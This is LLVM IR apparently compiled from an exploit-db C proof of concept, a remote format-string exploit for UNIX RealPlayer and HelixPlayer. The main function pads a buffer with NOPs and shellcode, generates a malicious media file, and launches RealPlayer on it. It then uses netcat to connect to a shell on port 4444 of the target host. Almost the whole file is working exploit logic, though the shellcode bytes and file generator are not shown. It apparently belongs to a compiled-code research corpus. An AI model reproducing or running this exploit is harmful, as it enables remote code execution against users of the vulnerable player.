; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1232.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1232.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [69 x i8] c"\0ARemote format string exploit POC for UNIX RealPlayer && HelixPlayer\00", align 1
@.str.1 = private unnamed_addr constant [70 x i8] c"Code tested on Debian 3.1 against RealPlayer 10 Gold's latest version\00", align 1
@.str.2 = private unnamed_addr constant [64 x i8] c"by c0ntex || c0ntexb@gmail.com || http://www.open-security.org\0A\00", align 1
@BUFFER = common dso_local global i64 0, align 8
@.str.3 = private unnamed_addr constant [21 x i8] c"[!] Could not malloc\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@NOPS = common dso_local global i32 0, align 4
@hellcode = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [69 x i8] c"[-] Completed creation of test file!\0A[-] Executing RealPlayer now...\00", align 1
@.str.5 = private unnamed_addr constant [33 x i8] c"[!] Could not fork off, bailing!\00", align 1
@VULN = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [9 x i8] c"realplay\00", align 1
@filename = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [39 x i8] c"[!] Could not execute realplayer... :(\00", align 1
@.str.8 = private unnamed_addr constant [94 x i8] c"[-] Connecting to shell in 10 seconds\0A** YOU MIGHT HAVE TO HIT RETURN ON REALPLAYER WINDOW **\00", align 1
@NETCAT = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [3 x i8] c"nc\00", align 1
@HOST = common dso_local global i32 0, align 4
@.str.10 = private unnamed_addr constant [5 x i8] c"4444\00", align 1
@.str.11 = private unnamed_addr constant [44 x i8] c"[!] Could not connect, check the core file!\00", align 1
@EXIT_SUCCESS = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* null, i8** %6, align 8
  %7 = call i32 @puts(i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str, i64 0, i64 0))
  %8 = call i32 @puts(i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.1, i64 0, i64 0))
  %9 = call i32 @puts(i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.2, i64 0, i64 0))
  %10 = load i64, i64* @BUFFER, align 8
  %11 = call i64 @malloc(i64 %10)
  %12 = inttoptr i64 %11 to i8*
  store i8* %12, i8** %6, align 8
  %13 = load i8*, i8** %6, align 8
  %14 = icmp ne i8* %13, null
  br i1 %14, label %18, label %15

15:                                               ; preds = %2
  %16 = call i32 @puts(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.3, i64 0, i64 0))
  %17 = load i32, i32* @EXIT_FAILURE, align 4
  store i32 %17, i32* %3, align 4
  br label %64

18:                                               ; preds = %2
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* @NOPS, align 4
  %21 = load i64, i64* @BUFFER, align 8
  %22 = call i32 @memset(i8* %19, i32 %20, i64 %21)
  %23 = load i8*, i8** %6, align 8
  %24 = load i64, i64* @BUFFER, align 8
  %25 = load i32, i32* @hellcode, align 4
  %26 = call i64 @strlen(i32 %25)
  %27 = sub i64 %24, %26
  %28 = getelementptr inbounds i8, i8* %23, i64 %27
  %29 = load i32, i32* @hellcode, align 4
  %30 = load i32, i32* @hellcode, align 4
  %31 = call i64 @strlen(i32 %30)
  %32 = call i32 @memcpy(i8* %28, i32 %29, i64 %31)
  %33 = load i8*, i8** %6, align 8
  %34 = load i64, i64* @BUFFER, align 8
  %35 = getelementptr inbounds i8, i8* %33, i64 %34
  store i8 0, i8* %35, align 1
  %36 = load i8*, i8** %6, align 8
  %37 = call i32 @filegen(i8* %36)
  %38 = call i32 @puts(i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.4, i64 0, i64 0))
  %39 = call i32 (...) @fork()
  switch i32 %39, label %52 [
    i32 -1, label %40
    i32 0, label %43
  ]

40:                                               ; preds = %18
  %41 = call i32 @puts(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.5, i64 0, i64 0))
  %42 = load i32, i32* @EXIT_FAILURE, align 4
  store i32 %42, i32* %3, align 4
  br label %64

43:                                               ; preds = %18
  %44 = load i32, i32* @VULN, align 4
  %45 = load i32, i32* @filename, align 4
  %46 = call i64 (i32, i8*, i32, i8*, ...) @execl(i32 %44, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0), i32 %45, i8* null)
  %47 = icmp slt i64 %46, 0
  br i1 %47, label %48, label %51

48:                                               ; preds = %43
  %49 = call i32 @puts(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.7, i64 0, i64 0))
  %50 = load i32, i32* @EXIT_FAILURE, align 4
  store i32 %50, i32* %3, align 4
  br label %64

51:                                               ; preds = %43
  br label %52

52:                                               ; preds = %51, %18
  %53 = call i32 @puts(i8* getelementptr inbounds ([94 x i8], [94 x i8]* @.str.8, i64 0, i64 0))
  %54 = call i32 @sleep(i32 10)
  %55 = load i32, i32* @NETCAT, align 4
  %56 = load i32, i32* @HOST, align 4
  %57 = call i64 (i32, i8*, i32, i8*, ...) @execl(i32 %55, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.9, i64 0, i64 0), i32 %56, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i64 0, i64 0), i8* null)
  %58 = icmp slt i64 %57, 0
  br i1 %58, label %59, label %62

59:                                               ; preds = %52
  %60 = call i32 @puts(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.11, i64 0, i64 0))
  %61 = load i32, i32* @EXIT_FAILURE, align 4
  store i32 %61, i32* %3, align 4
  br label %64

62:                                               ; preds = %52
  %63 = load i32, i32* @EXIT_SUCCESS, align 4
  store i32 %63, i32* %3, align 4
  br label %64

64:                                               ; preds = %62, %59, %48, %40, %15
  %65 = load i32, i32* %3, align 4
  ret i32 %65
}

declare dso_local i32 @puts(i8*) #1

declare dso_local i64 @malloc(i64) #1

declare dso_local i32 @memset(i8*, i32, i64) #1

declare dso_local i32 @memcpy(i8*, i32, i64) #1

declare dso_local i64 @strlen(i32) #1

declare dso_local i32 @filegen(i8*) #1

declare dso_local i32 @fork(...) #1

declare dso_local i64 @execl(i32, i8*, i32, i8*, ...) #1

declare dso_local i32 @sleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
